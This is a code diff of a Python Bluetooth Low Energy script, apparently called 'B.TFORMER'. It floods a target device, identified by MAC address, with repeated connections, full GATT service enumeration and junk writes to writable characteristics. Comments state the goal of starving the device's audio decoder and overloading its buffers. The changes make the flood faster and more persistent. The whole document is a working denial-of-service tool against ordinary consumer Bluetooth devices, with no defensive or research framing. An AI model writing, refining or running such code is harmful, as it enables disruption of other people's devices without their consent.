@@ -2,23 +2,34 @@ import asyncio
 from bleak import BleakClient
 
 async def start_protocol_interference(target_mac):
-    print(f"[!] Target Acquired: {target_mac}")
-    junk_payload = bytearray([0xFF] * 20) # 20 bytes of "noise"
+    print(f"\n[!] B.TFORMER ACTIVE: Targeting {target_mac}")
+    print("[*] Strategy A: GATT Service Enumeration Flood initiated.")
     
+    count = 0
     while True:
         try:
-            async with BleakClient(target_mac, timeout=5.0) as client:
-                print(f"[+] Connected. Flooding GATT characteristics...")
-                services = client.services
+            # Short timeout forces the script to 'hammer' the device faster
+            async with BleakClient(target_mac, timeout=1.2) as client:
+                count += 1
+                print(f"[+] Burst #{count}: Target Synchronized. Enumerating Services...")
+                
+                # HEAVY OPERATION: Fetching the entire GATT database
+                # This steals CPU cycles from the music decoder (A2DP)
+                services = await client.get_services()
+                
+                # FORCE WRITE: Send a single bit to any writable characteristic
+                # This is like 'poking' the device's brain repeatedly
                 for service in services:
                     for char in service.characteristics:
-                        if "write" in char.properties:
-                            # 'response=False' makes the flood much faster
-                            await client.write_gatt_char(char.uuid, junk_payload, response=False)
+                        if "write-without-response" in char.properties:
+                            # Send a 1-byte 'junk' packet
+                            await client.write_gatt_char(char.uuid, b'\xFF', response=False)
+                            break
                 
-                print("[*] Packet burst sent. Cycling connection...")
-                await asyncio.sleep(0.2) # Avoid crashing your own BT driver
+                print(f"    [OK] Buffer Overloaded. Resetting connection...")
+                await client.disconnect()
                 
-        except Exception as e:
-            print("[-] Target signal disrupted or device rebooting. Retrying...")
-            await asyncio.sleep(1)
+        except Exception:
+            # If the device is busy or refuses, we just loop faster
+            count += 1
+            await asyncio.sleep(0.05) # Tiny gap to prevent your laptop from hanging
